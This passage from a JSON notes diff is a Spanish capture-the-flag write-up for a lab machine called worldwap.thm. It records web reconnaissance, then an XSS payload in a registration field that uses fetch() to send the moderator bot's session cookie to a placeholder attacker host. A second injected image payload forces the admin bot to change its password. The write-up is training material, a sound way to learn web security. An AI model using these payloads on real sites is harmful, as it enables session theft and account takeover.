ver la página de `login.php`:\n   ![[Pasted image 20260303125342.png]]\n   Nos apuntamos lo de `login.worldwap.thm`. Vamos a ver qué hay allí si lo metemos en el `/etc/hosts`:\n   ![[Pasted image 20260303125612.png]]\n   No hay nada.\n3. Vamos ahora a ver `register.php`:\n   ![[Pasted image 20260303125430.png]]\n   Dice que el moderador de la web debe aprobar nuestra cuenta, por lo que parece que pueda haber un bot mirando los registros y validándolos al otro lado.\n\nVamos a seguir ahora con `worldwap.thm:8081`.\n\n1. Comenzamos yendo a la página tal cual:\n   ![[Pasted image 20260303125648.png]]\n   Es igual que `login.worldwap.thm`. Si profundizamos haciendo un escaneo con `dirsearch` sobre `login.worldwap.thm` veremos que son exactamente las mismas páginas. Por lo que de ahora en adelante utilizaremos `login.worldwap.thm`.\n2. Vamos a ver qué hay en `login.php`:\n   ![[Pasted image 20260303125924.png]]\n   Parece un panel de inicio de sesión interno.\n\nCon toda la información que hemos recopilado hasta la fecha vamos ahora a la explotación de la página.\n\n-----------------------------------------\n<h2>Explotación</h2>\nEstá claro hasta ahora que primero necesitaremos meternos en la cuenta del moderador y luego en la del administrador, tanto por las preguntas sobre las flags como porque lo que hemos visto aparenta ser vulnerable hacia el moderador primero.\n\n1. Comenzamos yendo al formulario de registro de `worldwap.thm`:\n   ![[Pasted image 20260303130249.png]]\n2. Vamos a intentar realizar un ataque XSS para robar la cookie de sesión del moderador.\n\t1. Para ello necesitamos un payload: `<img src=\"x\" onerror=\"fetch('http://IP_ATACANTE:PUERTO_ATACANTE?cookie=' + document.cookie);\">`\n\t2. Y lo meteremos en uno de los campos.\n\t   ![[Pasted image 20260303133216.png]]\n\t3. Levantaremos un servidor de escucha.\n\t   ![[Pasted image 20260303133229.png]]\n\t4. Le daremos a `Register`:\n\t   ![[Pasted image 20260303130939.png]]\n\t5. Miraremos los resultados de conexión.\n\t   ![[Pasted image 20260303133317.png]]\n\t6. Cambiamos la cookie en `login.worldwap.thm/login.php`:\n\t   ![[Pasted image 20260303133418.png]]\n\nUna vez hemos obtenido la flag de `moderator` tenemos que averiguar la forma de conseguir la flag de admin.\n\nSi investigamos la página podemos ver que hay un formulario de cambio de contraseña:\n\n![[Pasted image 20260303133545.png]]\n\nTambién observamos que hay un chat en el que sólo hay un usuario en linea, el administrador:\n\n![[Pasted image 20260303133631.png]]\n\nAdemás es un bot, justo como moderator.\n\n1. Vamos a usar una técnica de CSRF para intentar cambiar la contraseña del admin, puesto que el cambio de contraseña está reservado a él.\n   ![[Pasted image 20260303133731.png]]\n2. Para ello primero vamos a capturar una petición de esta página.\n   ![[Pasted image 20260303134011.png]]\n3. Ahora vamos al chat y crafteamos una imagen maliciosa.\n\n```\n<img src=\"x\" onerror=\"fetch('/change_password.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'new_password=1234'})\">\n```\n\n3. La escribimos en el chat del admin bot.\n   ![[Pasted image 20260303134058.png]]\n4. Ahora cerramos la sesión del moderador y nos logueamos como admin con `admin:1234`.\n   ![[Pasted image 20260303134135.png]]\n5. Y así es como conseguimos la flag de admin de forma legítima.\n   ![[Pasted image 20260303134202.png]]\n\n-----------------------------------\n<h2>Conclusión</h2>\nEn esta máquina hemos podido observar un vector de ataque (`HttpOnly: false`) que nos permitía obtener la cookie en JavaScript y mandarla a un servidor externo mediante XSS. Con esa cookie podíamos explotar una vulnerabilidad CSRF en el chat para conseguir que el admin cambiara su contraseña sin querer y con ello iniciar sesión como administrador del sitio.\n\nUn reto divertido que pone a prueba alguna de las técnicas aprendidas en el módulo de ataques avanzados del lado del cliente.\n\n>[!SUCCESS] Reto superado!",
+    "modified": "2026-03-03T17:02:38"
   },
   {
     "title": "2. Revengeee",
